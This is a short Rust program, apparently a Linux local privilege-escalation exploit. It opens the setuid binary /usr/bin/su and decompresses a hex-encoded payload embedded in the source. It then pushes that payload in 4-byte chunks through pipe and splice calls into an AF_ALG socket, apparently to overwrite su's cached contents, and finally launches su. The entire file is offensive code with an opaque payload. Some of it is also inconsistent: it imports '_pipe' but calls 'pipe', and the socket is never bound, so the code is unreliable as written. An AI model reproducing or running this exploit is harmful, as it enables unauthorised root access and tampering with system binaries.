use std::fs::File;
use std::os::unix::io::AsRawFd;
use std::process::Command;
use libc::{socket, _pipe, splice, AF_ALG, SOCK_SEQPACKET, SPLICE_F_MOVE};
use flate2::read::ZlibDecoder;
use std::io::Read;

fn from_hex(hex: &str) -> Vec<u8> {
    (0..hex.len()).step_by(2)
        .map(|i| u8::from_str_radix(&hex[i..i + 2], 16).unwrap())
        .collect()
}

fn exploit_step(f_fd: i32, data: &[u8]) {
    unsafe {
        let fd = socket(AF_ALG, SOCK_SEQPACKET, 0);
        
        let mut pipes = [0i32; 2];
        pipe(pipes.as_mut_ptr());
        
        splice(f_fd, std::ptr::null_mut(), pipes[1], std::ptr::null_mut(), data.len(), SPLICE_F_MOVE);
        splice(pipes[0], std::ptr::null_mut(), fd, std::ptr::null_mut(), data.len(), SPLICE_F_MOVE);
    }
}

fn main() {
    let file = File::open("/usr/bin/su").expect("Konnte su nicht öffnen");
    let f_fd = file.as_raw_fd();

    let compressed_hex = "78daab77f57163626464800126063b0610af82c101cc7760c0040e0c160c301d209a154d16999e07e5c1680601086578c0f0ff864c7e568f5e5b7e10f75b9675c44c7e56c3ff593611fcacfa499979fac5190c0c0c0032c310d3";
    let compressed_data = from_hex(compressed_hex);
    let mut decoder = ZlibDecoder::new(&compressed_data[..]);
    let mut payload = Vec::new();
    decoder.read_to_end(&mut payload).unwrap();

    for (_i, chunk) in payload.chunks(4).enumerate() {
        exploit_step(f_fd, chunk);
    }

    Command::new("su").status().expect("Fehler beim Ausführen von su");
}
